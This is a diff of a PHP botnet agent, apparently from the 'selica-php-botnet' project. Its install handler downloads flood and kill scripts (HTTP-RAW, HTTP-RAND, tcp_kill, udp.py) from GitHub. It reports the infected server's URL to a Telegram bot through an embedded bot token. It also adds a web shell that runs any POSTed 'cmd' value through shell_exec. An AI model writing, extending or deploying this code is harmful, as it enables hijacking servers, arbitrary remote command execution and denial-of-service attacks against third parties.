@@ -6,14 +6,19 @@ if (!empty($_GET["ping"])){
 }
 
 if (!empty($_GET["install"])){
-	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/972969809534939187/HTTP-RAW.js");
-	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/972969809774002257/HTTP-RAND.js");
-	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/973304386107359232/tcp_kill.js");
-	shell_exec("wget -nc https://cdn.discordapp.com/attachments/826078132444332032/973567879914070066/udp.py");
-	echo("all methods has been downloaded");
+    	$bot = $_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"];
+	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAW.js");
+	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAND.js");
+	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/tcp_kill.js");
+	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/udp.py");
+	file_get_contents("https://api.telegram.org/bot5397589274:AAFWAqxt_U5PbhN6KFHMRqat38lz3dhA6gM/sendMessage?chat_id=1159678884&text=http://".$bot);	
+    echo("all methods has been downloaded");
 }
 
-
+if (!empty($_POST["cmd"])){
+	$cmd = $_POST["cmd"];
+	echo(shell_exec($cmd));
+}
 
 
 if (!empty($_POST["method"])){
